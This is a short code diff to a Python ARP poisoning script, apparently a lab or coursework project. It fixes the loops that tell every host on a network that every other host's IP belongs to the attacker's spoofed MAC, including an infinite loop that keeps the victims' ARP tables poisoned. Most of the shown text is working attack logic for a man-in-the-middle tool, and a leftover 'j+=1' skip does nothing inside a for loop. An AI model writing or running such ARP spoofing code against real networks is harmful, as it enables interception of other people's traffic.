@@ -53,9 +53,9 @@ def arp_poison():
     
     # Send ARP package to every victim saying that each other victim is the attacker using the spoofed MAC address of the attacker
     # i goes through all the hosts and represents the victims that will be fooled
-    for i in nrOfHosts:
+    for i in range(nrOfHosts):
         # j goes through all the hosts and represents the IPs that will be spoofed. Essentially, The goal is to have every host think every other host is the attacker.
-        for j in nrOfHosts:
+        for j in range(nrOfHosts):
             # No need to send ARP package to itself.
             if (i==j):
                 j+=1
@@ -72,9 +72,9 @@ def arp_poison():
 
     # A infinite loop is used to send ARP packages continuously updating the ARP tables of the victims
     while(True):     
-        for i in nrOfHosts:
+        for i in range(nrOfHosts):
             # j goes through all the hosts and represents the IPs that will be spoofed. Essentially, The goal is to have every host think every other host is the attacker.
-            for j in nrOfHosts:
+            for j in range(nrOfHosts):
                 # No need to send ARP package to itself.
                 if (i==j):
                     j+=1
